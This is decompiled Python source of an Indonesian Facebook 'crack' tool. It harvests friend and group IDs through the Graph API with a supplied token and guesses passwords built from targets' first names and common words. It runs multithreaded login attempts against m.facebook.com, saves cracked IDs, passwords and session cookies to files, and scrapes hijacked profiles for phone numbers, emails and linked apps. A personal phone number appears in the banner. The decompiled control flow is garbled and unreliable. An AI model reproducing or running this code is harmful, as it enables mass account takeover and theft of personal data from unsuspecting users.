# Source Generated with Decompyle++
# File: n.pyc (Python 3.10)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re

try:
    import rich
finally:
    pass
if ImportError:
    os.system('pip install rich')
    time.sleep(1)
    
    try:
        import rich
    finally:
        pass
    if ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
    

    from rich.table import Table as me
    from rich.console import Console as sol
    from bs4 import BeautifulSoup as parser
    from concurrent.futures import ThreadPoolExecutor as tred
    from rich.console import Group as gp
    from rich.panel import Panel as nel
    from rich import print as cetak
    from rich.markdown import Markdown as mark
    from rich.columns import Columns as col
    
    try:
        ugen = open('user.txt', 'r').read().splitlines()
    finally:
        pass
    ugen = [
        'Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.600 Mobile Safari/534.8+']
    
    try:
        ugen2 = open('user2.txt', 'r').read().splitlines()
    finally:
        pass
    ugen2 = [
        'Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.600 Mobile Safari/534.8+']
    (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
    x = '\x1b[m'
    k = '\x1b[93m'
    h = '\x1b[1;92m'
    hh = '\x1b[32m'
    u = '\x1b[95m'
    kk = '\x1b[33m'
    b = '\x1b[1;96m'
    p = '\x1b[0;34m'
    P = '\x1b[0;00m'
    J = '\x1b[0;33m'
    S = '\x1b[0;00m'
    N = '\x1b[0m'
    I = '\x1b[0;32m'
    C = '\x1b[0;36m'
    M = '\x1b[0;31m'
    U = '\x1b[0;35m'
    K = '\x1b[0;33m'
    P = '\x1b[00m'
    h = '\x1b[0;90m'
    Q = '\x1b[00m'
    kk = '\x1b[0;32m'
    ff = '\x1b[0;36m'
    G = '\x1b[0;36m'
    p = '\x1b[00m'
    h = '\x1b[0;90m'
    Q = '\x1b[00m'
    I = '\x1b[0;32m'
    II = '\x1b[0;36m'
    m = '\x1b[0;31m'
    O = '\x1b[0;33m'
    H = '\x1b[0;33m'
    b = '\x1b[0;36m'
    war = '[•]'
    B = random.choice([
        U,
        I,
        K,
        b,
        M])
    dic = {
        '1': 'Januari',
        '2': 'Februari',
        '3': 'Maret',
        '4': 'April',
        '5': 'Mei',
        '6': 'Juni',
        '7': 'Juli',
        '8': 'Agustus',
        '9': 'September',
        '10': 'Oktober',
        '11': 'November',
        '12': 'Desember' }
    dic2 = {
        '01': 'Januari',
        '02': 'Februari',
        '03': 'Maret',
        '04': 'April',
        '05': 'Mei',
        '06': 'Juni',
        '07': 'Juli',
        '08': 'Agustus',
        '09': 'September',
        '10': 'Oktober',
        '11': 'November',
        '12': 'Desember' }
    tgl = datetime.datetime.now().day
    bln = dic[str(datetime.datetime.now().month)]
    thn = datetime.datetime.now().year
    okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
    cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
    
    def jalan(z):
        pass

    
    def mlaku(z):
        pass

    
    def clear():
        os.system('clear')

    
    def back():
        login()

    
    def banner():
        clear()
        print('%s\n\t\n\n\x1b[95m██████╗░░█████╗░██████╗░██╗░░░██╗░██████╗\n\x1b[95m██╔══██╗██╔══██╗██╔══██╗██║░░░██║██╔════╝\n\x1b[95m██████╦╝███████║██████╔╝██║░░░██║╚█████╗░\n\x1b[1;32m██╔══██╗██╔══██║██╔══██╗██║░░░██║░╚═══██╗\n\x1b[1;92m██████╦╝██║░░██║██║░░██║╚██████╔╝██████╔╝\n\x1b[0;34m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░\n\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n\x1b[0;34m█  \x1b[mGithub: https://github.com/jepribarus\n\x1b[0;34m█  \x1b[mFacebook: Jepri Barus\n\x1b[0;34m█  \x1b[mWhatsApp: 085767354326\n\x1b[0;34m█  \x1b[mTools : \x1b[1;96mPremium\n\x1b[0;34m█  \x1b[mDi Update : \x1b[1;96mRabu 20-04-2022\n\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n' % h)

    
    def login():
        
        try:
            token = open('.token.txt', 'r').read()
            tokenku.append(token)
            
            try:
                sy = requests.get('https://graph.facebook.com/me?access_token=' + tokenku[0])
                sy2 = json.loads(sy.text)['name']
                menu(sy2)
            finally:
                return None
                if KeyError:
                    login_kontol()
                return None
                if requests.exceptions.ConnectionError:
                    banner()
                    li = '# KONEKSI INTERNET BERMASALAH'
                    lo = mark(li, 'red', **('style',))
                    sol().print(lo, 'cyan', **('style',))
                    exit()
                return None
                if IOError:
                    login_kontol()
                    return None



    
    def login_kontol():
        banner()
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        print('%s    \x1b[1;32mMASUKAN TOKEN FACEBOOK ' % h)
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        panda = input(x + '\x1b[1;96m•Token> ')
        akun = open('.token.txt', 'w').write(panda)
        
        try:
            tes = requests.get('https://graph.facebook.com/me?access_token=' + panda)
            tes3 = json.loads(tes.text)['name']
            print('%s \n' % h)
            print('%s \x1b[1;32m1' % h)
            print('%s \x1b[1;32m2' % h)
            print('%s \x1b[1;32m3' % h)
            print('%s \x1b[1;32mDOOORR' % h)
            print('%s \x1b[1;96mJalan kan perintah python barus.py ' % h)
            print('%s \n' % h)
            print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
            jalan('%s╚══[%s✓%s] %s\x1b[1;96mLOGIN BERHASIL JALANKAN ULANG TOOLS' % (M, P, M, P))
            print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
            time.sleep(2.5)
            exit()
        finally:
            return None
            if KeyError:
                print('%s \n' % h)
                jalan('%s╚══[%s!%s] %sLOGIN GAGAL CEK AKUN TUMBAL ANDA' % (M, P, M, P))
                time.sleep(2.5)
                login_kontol()
                return None
            if requests.exceptions.ConnectionError:
                li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                lo = mark(li, 'yellow', **('style',))
                sol().print(lo, 'cyan', **('style',))
                exit()
                return None


    
    def menu(my_name):
        banner()
        print(x + '\x1b[95mNAMA  : ' + str(my_name))
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        print('%s \x1b[1;32m[01] Crack Dari Daftar Teman ' % h)
        print('%s \x1b[1;32m[02] Crack Dari Id Masal/publik ' % h)
        print('%s \x1b[1;32m[03] Crack Dari Grup ' % h)
        print('%s \x1b[1;32m[04] Cek Hasil Crack ' % h)
        print('%s \x1b[1;32m[05] Cek Opsi Cp' % h)
        print('%s \x1b[1;33m[00] Log-out' % h)
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        jh = input(x + '\x1b[1;96m•Input Number> ')
        if jh in ('1', '01'):
            dump_publik()
            return None
        if None in ('2', '02'):
            dump_massal()
            return None
        if None in ('3', '03'):
            grup()
            return None
        if None in ('4', '04'):
            result()
            return None
        if None in ('5', '05'):
            file()
            return None
        if None in ('0', '00'):
            os.system('rm -rf .token.txt')
            print(x + '\x1b[1;96m•Sabar Nunggu Ojek ...')
            time.sleep(1)
            print('%s \x1b[1;33mSUKSES KELUAR CROTT AHH ' % h)
            exit()
            return None
        None('%s \x1b[1;33mNgajak gelud om pilih yang bener ' % h)
        exit()

    
    def result():
        cek = '# CEK RESULT CRACK'
        sol().print(mark(cek, 'green', **('style',)))
        kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
        kis = nel(kayes, 'cyan', **('style',))
        cetak(nel(kis, 'RESULTS', **('title',)))
        kz = input(x + '[' + p + 'f' + x + '] Pilih : ')
        if kz in ('1', '01'):
            
            try:
                vin = os.listdir('CP')
            finally:
                pass
            if FileNotFoundError:
                gada = '# DIREKTORI TIDAK DITEMUKAN'
                sol().print(mark(gada, 'red', **('style',)))
                time.sleep(2)
                back()
            elif len(vin) == 0:
                haha = '# ANDA BELUM MEMILIKI RESULT CP'
                sol().print(mark(haha, 'yellow', **('style',)))
                time.sleep(2)
                back()
                return None
                gerr = '# HASIL CP ANDA'
                sol().print(mark(gerr, 'green', **('style',)))
                cih = 0
                lol = { }
                for isi in vin:
                    
                    try:
                        hem = open('CP/' + isi, 'r').readlines()
                    finally:
                        pass
                    continue
                    cih += 1
                    if cih < 10:
                        nom = '0' + str(cih)
                        lol.update({
                            str(cih): str(isi) })
                        lol.update({
                            nom: str(isi) })
                        print('[' + nom + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x)
                        continue
                        lol.update({
                            str(cih): str(isi) })
                        print('[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x)
                        continue
                        gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
                        sol().print(mark(gerr2, 'green', **('style',)))
                        geeh = input(x + '[' + p + 'f' + x + '] Pilih : ')
                        
                        try:
                            geh = lol[geeh]
                        finally:
                            pass
                        if KeyError:
                            ric = '# PILIHAN TIDAK ADA DI MENU'
                            sol().print(mark(ric, 'red', **('style',)))
                            exit()
                        else:
                            
                            try:
                                lin = open('CP/' + geh, 'r').read()
                            finally:
                                pass
                            hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
                            sol().print(mark(hehe, 'red', **('style',)))
                            time.sleep(2)
                            back()
                            akun = '# LIST AKUN CP ANDA'
                            sol().print(mark(akun, 'green', **('style',)))
                            hus = os.system('cd CP && cat ' + geh)
                            akun2 = '# LIST AKUN CP ANDA'
                            sol().print(mark(akun, 'green', **('style',)))
                            input(x + '[' + h + '•' + x + '] Kembali')
                            back()
                            return None
                            if kz in ('2', '02'):
                                
                                try:
                                    vin = os.listdir('OK')
                                finally:
                                    pass
                                if FileNotFoundError:
                                    gada = '# DIREKTORI TIDAK DITEMUKAN'
                                    sol().print(mark(gada, 'red', **('style',)))
                                    time.sleep(2)
                                    back()
                                elif len(vin) == 0:
                                    haha = '# ANDA BELUM MEMILIKI RESULT OK'
                                    sol().print(mark(haha, 'yellow', **('style',)))
                                    time.sleep(2)
                                    back()
                                    return None
                                    gerr = '# HASIL OK ANDA'
                                    sol().print(mark(gerr, 'green', **('style',)))
                                    cih = 0
                                    lol = { }
                                    for isi in vin:
                                        
                                        try:
                                            hem = open('OK/' + isi, 'r').readlines()
                                        finally:
                                            pass
                                        continue
                                        cih += 1
                                        if cih < 100:
                                            nom = '0' + str(cih)
                                            lol.update({
                                                str(cih): str(isi) })
                                            lol.update({
                                                nom: str(isi) })
                                            print('[' + nom + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x)
                                            continue
                                            lol.update({
                                                str(cih): str(isi) })
                                            print('[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x)
                                            continue
                                            gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
                                            sol().print(mark(gerr2, 'green', **('style',)))
                                            geeh = input(x + '[' + p + 'f' + x + '] Pilih : ')
                                            
                                            try:
                                                geh = lol[geeh]
                                            finally:
                                                pass
                                            if KeyError:
                                                ric = '# PILIHAN TIDAK ADA DI MENU'
                                                sol().print(mark(ric, 'red', **('style',)))
                                                exit()
                                            else:
                                                
                                                try:
                                                    lin = open('OK/' + geh, 'r').read()
                                                finally:
                                                    pass
                                                hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
                                                sol().print(mark(hehe, 'red', **('style',)))
                                                time.sleep(2)
                                                back()
                                                akun = '# LIST AKUN OK ANDA'
                                                sol().print(mark(akun, 'green', **('style',)))
                                                hus = os.system('cd OK && cat ' + geh)
                                                akun2 = '# LIST AKUN OK ANDA'
                                                sol().print(mark(akun, 'green', **('style',)))
                                                input(x + '[' + h + '•' + x + '] Kembali')
                                                back()
                                                return None
                                                if kz in ('0', '00'):
                                                    back()
                                                    return None
                                                ric = None
                                                sol().print(mark(ric, 'red', **('style',)))
                                                exit()
                                                return None









    
    def file():
        tek = '# CEK OPSI DARI FILE'
        sol().print(mark(tek, 'cyan', **('style',)), 'on red', **('style',))
        print(x + '[' + h + '•' + x + '] Sedang Membaca File, Tunggu Sebentar ...')
        time.sleep(2)
        teks = '# PILIH FILE YG AKAN DI CEK'
        sol().print(mark(teks, 'green', **('style',)))
        my_files = []
        
        try:
            lis = os.listdir('CP KONTOL')
        finally:
            pass
        
        try:
            mer = os.listdir('OK')
        finally:
            pass
        if len(my_files) == 0:
            yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
            sol().print(mark(yy, 'red', **('style',)))
            exit()
            return None
        cih = None
        lol = { }
        for isi in my_files:
            
            try:
                hem = open('CP/' + isi, 'r').readlines()
            finally:
                pass
            
            try:
                hem = open('OK/' + isi, 'r').readlines()
            finally:
                pass
            continue
            cih += 1
            if cih < 10:
                nom = '0' + str(cih)
                lol.update({
                    str(cih): str(isi) })
                lol.update({
                    nom: str(isi) })
                print('[' + nom + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x)
                continue
                lol.update({
                    str(cih): str(isi) })
                print('[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x)
                continue
                teks2 = '# PILIH FILE YG AKAN DI CEK'
                sol().print(mark(teks2, 'green', **('style',)))
                geeh = input(x + '[' + p + 'f' + x + '] Pilih : ')
                
                try:
                    geh = lol[geeh]
                finally:
                    pass
                if KeyError:
                    ric = '# PILIHAN TIDAK ADA DI MENU'
                    sol().print(mark(ric, 'red', **('style',)))
                    exit()
                else:
                    
                    try:
                        hf = open('CP/' + geh, 'r').readlines()
                        cek_opsi()
                    finally:
                        return None
                        if IOError:
                            
                            try:
                                hf = open('OK/' + geh, 'r').readlines()
                                cek_opsi()
                            finally:
                                return None
                                if IOError:
                                    hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
                                    sol().print(mark(hehe, 'red', **('style',)))
                                    time.sleep(2)
                                    back()
                                    return None








    
    def dump_publik():
        clear()
        banner()
        
        try:
            token = open('.token.txt', 'r').read()
        finally:
            pass
        if IOError:
            exit()
        else:
            print('%s \x1b[1;32m√CRACK DARI DAFTAR TEMAN ' % h)
            print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
            pil = input(x + '\x1b[1;96m•Masukkan ID Teman> : ')
            
            try:
                koh2 = requests.get('https://graph.facebook.com/v2.0/' + pil + '?fields=friends.limit(5000)&access_token=' + tokenku[0]).json()
                for pi in koh2['friends']['data']:
                    
                    try:
                        id.append(pi['id'] + '|' + pi['name'])
                    finally:
                        continue
                        continue
                        print(x + '[' + h + '•' + x + '] Total : ' + str(len(id)))
                        setting()
                        return None
                        if requests.exceptions.ConnectionError:
                            print('%s \x1b[1;33mKoneksi Internet bermasalah ' % h)
                            exit()
                            return None
                        if (KeyError, IOError):
                            print('%s \x1b[1;33mPertemanan Tidak Publik ' % h)
                            exit()
                            return None




    
    def dump_massal():
        clear()
        banner()
        print('%s \x1b[1;32m√DUMP ID PUBLIK/MASAL ' % h)
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        print(x + '\x1b[1;96m•MASUKKAN JUMLAH ID CONTOH "1" (LIMIT 15)')
        
        try:
            jum = int(input(x + '\x1b[1;96m•MAU CRACK BERAPA ID> '))
        finally:
            pass
        if ValueError:
            pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
            pesan2 = mark(pesan, 'yellow', **('style',))
            sol().print(pesan2)
            exit()
        elif jum < 1 or jum > 10:
            pesan = '# OUT OF RANGE MEN'
            pesan2 = mark(pesan, 'yellow', **('style',))
            sol().print(pesan2)
            exit()
            ses = requests.Session()
            yz = 0
            for userr in uid:
                
                try:
                    col = ses.get('https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0]).json()
                    for mi in col['friends']['data']:
                        
                        try:
                            iso = mi['id'] + '|' + mi['name']
                            if iso in id:
                                id.append(iso)
                        finally:
                            continue
                            [ kl for met in range(jum) ]
                            continue
                            continue
                            if (KeyError, IOError):
                                continue
                                if requests.exceptions.ConnectionError:
                                    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                                    lo = mark(li, 'red', **('style',))
                                    sol().print(lo, 'cyan', **('style',))
                                    exit()
                                    continue
                                    tot = '# BERHASIL DUMP %s ID ' % len(id)
                                    if len(id) == 0:
                                        tot2 = mark(tot, 'red', **('style',))
                                    
                            tot2 = mark(tot, 'cyan', **('style',))
                            sol().print(tot2)
                            setting()
                            return None




    
    def setting():
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        print('%s \x1b[1;32m[01] Akun Tertua (\x1b[1;96mTidak Di Sarankan)' % h)
        print('%s \x1b[1;32m[02] Akun Termuda (\x1b[1;96mDi Sarankan)' % h)
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        hu = input(x + '\x1b[1;96m•Input Number>')
        if hu in ('1', '01') or hu in ('2', '02'):
            print('%s \x1b[1;33mPilihan Tidak Ada Di Menu' % h)
            exit()
            print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
            print('%s \x1b[1;32m[01] B-Api (\x1b[1;96mTidak Di Sarankan)' % h)
            print('%s \x1b[1;32m[02] Mobile (\x1b[1;32m PRO )' % h)
            print('%s \x1b[1;32m[03] Mbasic (\x1b[1;96mLELET )' % h)
            print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
            hc = input(x + '\x1b[1;96m•Input Number> : ')
            if hc in ('1', '01'):
                method.append('api')
            elif hc in ('3', '03'):
                method.append('Mbasic')
            else:
                method.append('mobile')
                print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
                aplik = input(x + '\x1b[1;96m•Tampilkan Aplikasi Terkait ? [ketik y] (y/t) : ')
                if aplik in ('y', 'Y'):
                    taplikasi.append('ya')
                else:
                    taplikasi.append('no')
                    osk = input(x + '\x1b[1;33m•Tampilkan Opsi CP ? [ Tidak Disarankan ] (y/t)> ')
                    if osk in ('y', 'Y'):
                        oprek.append('ya')
                    else:
                        oprek.append('no')
                        passwrd()
                        return None

    
    def passwrd():
        clear()
        banner()
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        print('%s\x1b[1;95m•Hasil Ok  Disimpan Ke : OK/%s\n\x1b[1;95m•Hasil Cp Disimpan Ke : CP/%s\n\x1b[1;95m•TRUN ON/OF MODE PESAWAT SETIAP 500 Id\n\x1b[1;96m•SEDANG PROSES CRACK SABAR SAYANG' % (h, okc, cpc))
        print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        with tred(30, **('max_workers',)) as pool:
            for yuzong in id2:
                idf = yuzong.split('|')[0]
                nmf = yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = [
                    'sayang',
                    'sayangku',
                    'sayang123',
                    'freefire',
                    'garena123',
                    'katasandi',
                    'garena']
            pwv.append(frs + '123')
            pwv.append(frs + '1234')
            pwv.append(frs + '12345')
        if len(frs) < 3:
            pwv.append(nmf)
        else:
            pwv.append(nmf)
            pwv.append(frs + '123')
        pwv.append(frs + '1234')
        pwv.append(frs + '12345')
        if 'mobile' in method:
            pool.submit(crack, idf, pwv)
            continue
            if 'api' in method:
                pool.submit(crack2, idf, pwv)
                continue
                if 'free' in method:
                    pool.submit(crack3, idf, pwv)
                    continue
                    pool.submit(crack, idf, pwv)
                None(None, None, None)
            elif not None:
                print('')
                print('%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
                woi = input(x + '\x1b[1;96m•Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
                if woi in ('y', 'Y'):
                    cek_opsi()
                    return None
                None()
                return None

    
    def crack(idf, pwv):
        global cp, ok, loop
        bi = random.choice([
            u,
            k,
            kk,
            b,
            h,
            hh])
        pers = loop * 100 / len(id2)
        fff = '%'
        print('\r%s [Barus] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
            
            try:
                tix = time.time()
                ses.headers.update({
                    'Host': 'm.facebook.com',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ua2,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'dnt': '1',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-user': 'empty',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://m.facebook.com/',
                    'accept-encoding': 'gzip, deflate br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
                dataa = {
                    'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                    'uid': idf,
                    'flow': 'login_no_pin',
                    'pass': pw,
                    'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
                ses.headers.update({
                    'Host': 'm.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://m.facebook.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-user': 'empty',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                    'accept-encoding': 'gzip, deflate br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', dataa, False, **('data', 'allow_redirects'))
                if 'checkpoint' in po.cookies.get_dict().keys():
                    if 'ya' in oprek:
                        akun.append(idf + '|' + pw)
                        ceker(idf, pw)
                    else:
                        print('\n')
                        statuscp = f'''➾ ID       : {idf}\n➾ PASSWORD : {pw}'''
                        statuscp1 = nel(statuscp, 'yellow', **('style',))
                        cetak(nel(statuscp1, 'YAH AKUN CP', **('title',)))
                        open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                        akun.append(idf + '|' + pw)
                        cp += 1
                elif 'c_user' in ses.cookies.get_dict().keys():
                    headapp = {
                        'user-agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.600 Mobile Safari/534.8+' }
                    if 'no' in taplikasi:
                        ok += 1
                        coki = po.cookies.get_dict()
                        kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))
                        open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                        print('\n')
                        statusok = f'''➾ ID       : {idf}\n➾ PASSWORD : {pw}\n➾ COOKIE: {kuki}'''
                        statusok1 = nel(statusok, 'cyan', **('style',))
                        cetak(nel(statusok1, ' AKUN OK OM', **('title',)))
                elif 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ''
                    session = requests.Session()
                    get_id = session.get('https://m.facebook.com/profile.php', coki, headapp, **('cookies', 'headers')).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get('https://m.facebook.com/profile.php?v=info', coki, headapp, **('cookies', 'headers')).text
                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', coki, headapp, **('cookies', 'headers')).text
                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', coki, headapp, **('cookies', 'headers')).text
                    responscee4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', coki, headapp, **('cookies', 'headers')).text
                    
                    try:
                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    finally:
                        pass
                    nomer = ''
                    
                    try:
                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    finally:
                        pass
                    email = ''
                    
                    try:
                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    finally:
                        pass
                    ttl = ''
                    
                    try:
                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    finally:
                        pass
                    teman = ''
                    
                    try:
                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    finally:
                        pass
                    pengikut = ''
                    
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                    finally:
                        pass
                    (hit1, hit2) = (0, 0)
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text
                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                        infoakun += 'Aplikasi Yang Terkait*\n'
                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                        else:
                            infoakun += '\tAplikasi Aktif : \n'
                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                            if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                                infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                            else:
                                (hit1, hit2) = (0, 0)
                                infoakun += '\tAplikasi Kedaluwarsa :\n'
                                apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                                kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                    else:
                        print('\n')
                        statusok = f'''➾ ID       : {idf}\n➾ PASSWORD : {pw}\n➾ COOKIES  : {kuki}\n\x1b[1;33m{infoakun}'''
                        statusok1 = nel(statusok, 'cyan', **('style',))
                        cetak(nel(statusok1, 'AKUN OK OM', **('title',)))
                    finally:
                        pass
                    continue
                    continue
                    if requests.exceptions.ConnectionError:
